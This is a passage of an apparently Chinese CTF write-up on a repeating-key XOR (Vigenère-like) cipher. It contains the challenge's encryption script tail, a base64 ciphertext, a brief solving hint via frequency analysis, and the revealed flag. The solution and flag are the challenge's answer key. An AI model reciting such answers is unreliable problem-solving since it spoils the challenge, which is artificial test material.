</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> plain
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> flag<span style=color:#f92672>.</span>flag
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> key<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;flag{&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> key<span style=color:#f92672>.</span>endswith(<span style=color:#e6db74>&#34;}&#34;</span>)
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> key[<span style=color:#ae81ff>5</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> len(key) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> len(key) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> flag<span style=color:#f92672>.</span>languageOfPlain <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;English&#34;</span>
</span></span><span style=display:flex><span>    plain <span style=color:#f92672>=</span> getPlainText()
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> encryt(key, plain)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;cipher.txt&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        f<span style=color:#f92672>.</span>write(cipher<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;base_64&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></td></tr></table></div></div><p>cipher.txt</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-33>33</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>BwcIRTcACAcJUycaGBFSP4bX6WM7BA0DPw4UTTcAGwcUAAcUAQBJIkBhJE4wGgwEczsMAhMJGxqI
</span></span><span style=display:flex><span>nMY2GwZJP0kmBFIgAQd5EgEJFxEfSToGRy0UAQDP8OUoDVI9Gx0cIwcIF1QlCBwTSSRZUzNVNUkp
</span></span><span style=display:flex><span>AFImEQQSPUNNLxsGBxdHYj8WGBhBIg1LipzYPwAfP08uDRUFGQcITqXJ<span style=color:#f92672>/</span>zVMKRFLNUE4BGMyPQsf
</span></span><span style=display:flex><span>AANIPQ8ARysHB5ucwCgHAFh0OAgfP2UkQgINSQwCRSRVARFBKAAFAgA2BwYYIE8CA1QHBQptdCIQ
</span></span><span style=display:flex><span>UxhFKwwFAVN0CQcXcxsFAFQFEBoPU0A0EBxJIAUOFgA1Bg1TOwYeRRMHBQptaC8HEAFMKRpLBE4w
</span></span><span style=display:flex><span>SAEaIE8KDBIcGmQ0UCMRFgZNLQdMFgA3BwcHIQABbzUGDU4lQT4YEhoAOwAfDQA8ARpTNQYeEQdi
</span></span><span style=display:flex><span>KAADACkZFhVSIBBLLAAwBwdUJ08eABFIBBcURSYTUwFQIwdLEUg1HEkfOhwZbycADE4UQSMRX1RX
</span></span><span style=display:flex><span>JAwZAAcwSBAcJk8aBBoGCE4AT3V<span style=color:#f92672>/</span>OxtXbAQeBkh0EQYGcxgMCxoJSRwOUyFKeT0HIUkFClR0BAYc
</span></span><span style=display:flex><span>OAYDAlQOBhxHUyUYFhZPKBBhMkkgAEkAPAIIRQcdGQsVSD8YEhoAKwANEVNeOwYeNk8eEAQNGwYC
</span></span><span style=display:flex><span>UiV<span style=color:#f92672>/</span>IBtNKUkNBEkmER0SPwpNBxgBGh1taj8GB1RTIwQOEUg9Bg5TGk8OBBpIHRsVTmoBHH5zIwQO
</span></span><span style=display:flex><span>B08wEUk6cwwMC1QDAB0UKgNVBBVOOEkYCk0xHAEaPQhNDwEbHU4LSSEQUwBIJRphIU87RQ0cPEIJ
</span></span><span style=display:flex><span>ChtESQoIT2cRHBsNKAYEb2Q7B0QXPABAARsHRU4DTyVYFxtPRi0ECg0wBwZeNwACSVQMBgFKRCUa
</span></span><span style=display:flex><span>XhBPI2MkDQAdSB4SPRtNFhsFDBoPSSQSUx5VPx1LCUk<span style=color:#f92672>/</span>DUkHOwYebzAHBkMDTyVYFxtPYEkPCk95
</span></span><span style=display:flex><span>DAYcfgsCCn4sBgFKRCUaXhBPI0VLAU87RQ0cPGUpChtFDQEIDS4aHFgAKAYESEQ7B0QXPABnKhxI
</span></span><span style=display:flex><span>IE4QQSQBUwdPIQwfDUk6D0kZJhwZRRgBAgtHVCIcAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1L
</span></span><span style=display:flex><span>KUkfDUknYiBUJQpNBxENB04VRSsRGhpHbAsECksnSAYVcwABAX48AQtHTC8SFhpEP0kKC0R0HAEW
</span></span><span style=display:flex><span>cwIUERwbYzoPRWoBFgdULQQOC1QnSB0bNhZNERsEDWQzSC9VHhtPIkkKC0R0AR0AcwoOCR0YGgtt
</span></span><span style=display:flex><span>YSQRUydVPAwZCEE6SBwdIQABCQdiKE4UVSMBUxZFKgYZAAA8DUkfOgkZFn4qHBpHaW0YUxpPOEkf
</span></span><span style=display:flex><span>DUV0AwAdN08CA1QYDBwUTyRVBxxBOEkCEQAyAR0AWTwFAFQbCAcDDGoCGxFSKU4PRVk7HUkEMgED
</span></span><span style=display:flex><span>BFQPBlFtaCUCUxlVLwFLHE8hSB4SPQEMRQYBGgVYKgNSHlROIx1LCU87AwAdNE8LCgZIGgEKRSga
</span></span><span style=display:flex><span>Fw0qGwAfDQAnBwQWcxwYFREaARsKQSRVFB1GOBphNk85DUkAJh8IFxwNGwFtcyUYFlRGLQAZHFQ1
</span></span><span style=display:flex><span>BAxTMQMEFgdiIxsUVGoGHBlFOAECC0d0IUkQMgFNEQEaB04TT0AmHBlFLgYPHAAdSAoSPU8ADAcb
</span></span><span style=display:flex><span>YydHVysbB1RTIwQOEUg9Bg5TORoeEVQEAAUCAD4dGgcqBUkcBE4gSBocPgoZDR0GDk4NVTkBUxhJ
</span></span><span style=display:flex><span>JwxLEUg9G2M8O08kRQMJBxpHUyUYFgBIJQcMRUohGx1TPwYGAFQcAQcUKg4aHFlEIwZGAU87REkX
</span></span><span style=display:flex><span>PABAARsHRAoIT0AxHBsNKAYESEQ7B0VTNwACSBAHBmQjTyVYFxtPYQ0ECgx0DAYcfgsCClkMBgFt
</span></span><span style=display:flex><span>byJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFioQBwZeNwACSBAHBkJHRCUaXhBPI0QP
</span></span><span style=display:flex><span>Ck9eLAYcfgsCClkMBgFLAC4aHFlEIwZhIU87RQ0cPEIJChtESQoIT2cRHBsNKAYEb3c8DRsWdAtN
</span></span><span style=display:flex><span>HBVIHg8JTitVFBsfRiEEEgA5HQobcxYCEFQfCAAJQWoHGgdLc2MiQk10BgYHcwMCCh8BBwlHRiUH
</span></span><span style=display:flex><span>UwdPIQwJCkQtYj4aJwdNFhsFDE4UVToQARxVIQgFRUc9Dh0AWTwCCBFIGhsXRTgdFgZPRjoECEV0
</span></span><span style=display:flex><span>DggaIRYZBBgNSQwLSTkGeT5VPx1LFk85DR0bOgEKRT1ICg8JAD4AARoAOAZhNk85DQscNxZNLFQL
</span></span><span style=display:flex><span>CABHSyMGAH5pbB4KC1R0GwYeNhsFDBoPSQQSUz5VHx1LKUkfDUknYiYbcyZNEhUGHU4UTycQBxxJ
</span></span><span style=display:flex><span>Ig5LD1UnHEkfOgQIRQAAAB1tbyJVOlRXLQcfRVM7BQwHOwYDAlQCHB0TACYcGBEAOAECFiobAEk6
</span></span><span style=display:flex><span>cxgMCwBIGgEKRT4dGhpHbAMeFlR0BAAYNk8ZDR0b
</span></span></code></pre></td></tr></table></div></div><p>类似维吉尼亚的变种，key长度远小于plain，循环异或后可统计字频，南邮CTF平台有一题相似的。详见 <a href=https://findneo.github.io/171005NuptVigenereWP/>https://findneo.github.io/171005NuptVigenereWP/</a> 。稍微更改其中读取密文部分即可。<code>flag{Something Just Like This}</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>  1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>  2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3>  3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4>  4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-5>  5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-6>  6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-7>  7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-8>  8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-9>  9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-10> 10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-11> 11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-12> 12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-13> 13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-14> 14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-15> 15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-16> 16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-17> 17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-18> 18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-19> 19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-20> 20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-21> 21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-22> 22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-23> 23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-24> 24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-25> 25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-26> 26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-27> 27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-28> 28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-29> 29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-30> 30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-31> 31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-32> 32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-33> 33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-34> 34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-35> 35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-36> 36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-37> 37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-38> 38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-39> 39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-40> 40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-41> 41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-42> 42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-43> 43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-44> 44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-45> 45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-46> 46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-47> 47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-48> 48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-49> 49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-50> 50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-51> 51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-52> 52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-53> 53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-54> 54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-55> 55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-56> 56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-57> 57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-58> 58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-59> 59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-60> 60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-61> 61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-62> 62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-63> 63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-64> 64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-65> 65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-66> 66</a>
